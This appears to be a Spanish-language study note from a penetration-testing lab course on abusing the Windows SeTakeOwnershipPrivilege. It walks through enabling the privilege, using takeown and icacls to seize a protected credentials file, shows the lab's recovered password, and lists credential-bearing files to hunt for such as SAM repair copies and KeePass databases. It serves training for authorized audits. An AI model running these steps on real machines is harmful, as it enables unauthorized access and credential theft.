
## 1. ¿Qué es SeTakeOwnershipPrivilege?

`SeTakeOwnershipPrivilege` permite tomar posesión de objetos protegidos de Windows, como:

- Archivos y directorios NTFS.
    
- Claves de registro.
    
- Servicios y procesos.
    
- Objetos de Active Directory.
    

Este privilegio puede aprovecharse para acceder a archivos sensibles modificando su propietario y posteriormente sus permisos.

**Importante:** tomar posesión de un archivo no significa que podamos leerlo automáticamente. Puede ser necesario modificar su ACL.

---

## 2. Enumerar y habilitar el privilegio

### Comprobar privilegios

```
whoami /priv
```

**Resultado interesante:**

```
SeTakeOwnershipPrivilege    Take ownership of files or other objects    Disabled
```

Aunque aparezca como `Disabled`, el privilegio está asignado al usuario y puede habilitarse.

### Habilitar SeTakeOwnershipPrivilege

El módulo utiliza los siguientes scripts:

```
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

Comprobar nuevamente:

```
whoami /priv
```

**Resultado esperado:**

```
SeTakeOwnershipPrivilege    Enabled
```

---

## 3. Enumerar archivos y propietarios

Supongamos que encontramos un archivo sensible:

```
C:\Department Shares\Private\IT\cred.txt
```

### Consultar propietario y atributos

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' |
Select FullName,LastWriteTime,Attributes,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}
```

### Consultar propietarios del directorio

```
cmd /c dir /q 'C:\Department Shares\Private\IT'
```

Esto permite identificar qué usuarios o cuentas de servicio son propietarios de los archivos y directorios.

## 4. Explotación: tomar posesión de un archivo

### Paso 1 — Tomar posesión

```
takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

**Resultado esperado:**

```
SUCCESS: The file is now owned by user "WINLPE-SRV01\htb-student".
```

### Paso 2 — Confirmar propietario

```
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' |
Select Name,Directory,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner}}
```

### Paso 3 — Intentar leer el archivo

```
cat 'C:\Department Shares\Private\IT\cred.txt'
```

Es posible recibir:

```
Access to the path is denied.
```

Esto ocurre porque **ser propietario no concede automáticamente permisos de lectura**.

### Paso 4 — Modificar la ACL

Otorgar control total a nuestro usuario:

```
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```

**Parámetros:**

|Parámetro|Función|
|---|---|
|`/grant`|Concede permisos al usuario indicado.|
|`htb-student`|Usuario que recibirá los permisos.|
|`F`|Full Control (control total).|

### Paso 5 — Leer el archivo

```
cat 'C:\Department Shares\Private\IT\cred.txt'
```

**Resultado del laboratorio:**

```
NIX01 admin

root:n1X_p0wer_us3er!
```

Hemos conseguido acceder a un archivo que anteriormente no podíamos leer.

## 5. Archivos interesantes

Durante la enumeración podemos buscar archivos que contengan credenciales o configuraciones sensibles.

### Configuraciones de aplicaciones

```
C:\inetpub\wwwroot\web.config
```

### Archivos relacionados con el registro de Windows

```
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
```

### Copias de archivos del sistema

```
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

### Otros archivos interesantes

```
*.kdbx
passwords.*
pass.*
creds.*
*.config
*.xml
*.ps1
*.bat
```

**Buscar especialmente:**

- Bases de datos KeePass.
    
- Scripts con credenciales.
    
- Archivos de configuración.
    
- Contraseñas almacenadas.
    
- Claves SSH.
    
- Copias de seguridad.

## 8. Consideraciones importantes

Cambiar el propietario o los permisos de archivos puede afectar al funcionamiento de aplicaciones y servicios.

Antes de modificar un archivo, conviene registrar su propietario y sus ACL originales para poder restaurarlos.

En una auditoría real, estos cambios deben realizarse únicamente con autorización y, siempre que sea posible, revertirse después.

**Punto clave para CPTS/OSCP:** si encuentras `SeTakeOwnershipPrivilege`, recuerda la combinación:

```
takeown /f "C:\ruta\archivo"
icacls "C:\ruta\archivo" /grant usuario:F
type "C:\ruta\archivo"
```

Esta técnica puede permitir leer archivos sensibles a los que inicialmente no teníamos acceso.
